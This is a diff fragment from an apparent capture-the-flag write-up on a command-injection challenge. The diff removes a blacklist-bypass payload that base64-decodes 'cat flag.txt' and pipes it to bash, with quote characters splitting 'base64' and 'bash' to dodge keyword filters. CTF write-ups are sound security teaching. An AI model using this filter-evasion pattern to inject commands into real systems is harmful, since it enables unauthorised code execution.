@@ -214,16 +214,7 @@ This challenge is based on Command injection but we need to bypass the black lis
 ![Demon slayer](https://github.com/7h30ry/writeups/assets/51336409/05468899-dc15-4f5a-943a-5ce2eb355d33)
 
 Firstly ecode your command in base64
-```
-echo "cat flag.txt" | base64
-Y2F0IGZsYWcudHh0Cg==
-```
 
-Payload
-
-```
-echo Y2F0IGZsYWcudHh0Cg==|base6'4' -d|bas'h'
-```
 
 ![Screenshot from 2023-09-24 19-52-34](https://github.com/7h30ry/writeups/assets/51336409/5a305f02-158a-40ae-8e71-37031dc8eba9)
 
